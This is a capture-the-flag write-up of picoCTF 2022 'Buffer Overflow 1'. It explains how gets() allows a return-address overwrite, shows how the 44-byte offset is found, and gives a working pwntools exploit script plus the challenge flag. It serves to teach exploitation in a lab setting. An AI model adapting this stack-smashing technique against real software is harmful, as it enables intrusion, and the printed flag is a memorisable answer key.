# Buffer Overflow 1 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2022, Buffer Overflow 

## Description ##
Control the return address

## Approach ##
I am provided with a binary file called `vuln` and a C file called `vuln.c`. Inspecting the C file, I see `win` function that prints the flag, `vuln` function that uses `gets` to get the user input, and `main` function that calls `vuln`. Since `gets` does not check bounds, I can overwrite the return address to point to the `win` function:

    char buf[BUFSIZE];
    gets(buf);
    printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());

I then open up gdb and `checksec` the binary file:

    Arch:     i386
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No

What is interesting is that i386 is a 32-bit architecture, which means addresses are 4 bytes long. Now to calculate the padding. There are multiple ways to get the correct padding, I personally liked using `cyclic` (provided by pwntools)to determine the offset:

    pwndbg> cyclic 50
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
    .
    .
    .
    pwndbg> cyclic -l 0x6161616c
    Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
    Found at offset 44

Another way to figure out the padding is to break at `vuln` function and examine the stack, I can see that `0x804929a <vuln+25>    lea    eax, [ebp - 0x28]` indicates the buffer is at `ebp - 0x28`, which is 40 bytes. That means return address must be `ebp + 4` as `ebp` is below the return address. Thus `(ebp + 4) - (ebp - 0x28) = 4 + 0x28 = 44` bytes of padding are needed.

To figure out the address of `win` function, I can use `pwndbg` to disassemble it:

    pwndbg> disas win
    Dump of assembler code for function win:
    0x080491f6 <+0>:     endbr32

The address of the `win` function is `0x080491f6`. With these information, I can now craft my payload:

    from pwn import *
  
    HOST = 'saturn.picoctf.net'
    PORT = 65290
  
    p = remote(HOST, PORT) 
    # p = process('./vuln')
  
    # Pack the win address into 32 bits
    win_address = p32(0x080491f6) 
  
    # From buffer to return address is 44 bytes.  
    payload = b'a'*44 + win_address
  
    p.sendline(payload)
  
    p.interactive()

Running the script, I got the flag:

    Please enter your string:
    Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_b15b081e}

Flag: picoCTF{addr3ss3s_ar3_3asy_b15b081e}

## Reflection ## 
This buffer overflow challenge was a great introduction to basic stack manipulation and shows how program control flow can be redirected by overwriting the return address. Through this challenge, I learned the importance of understanding stack layout and being able to read and understand assembly code.




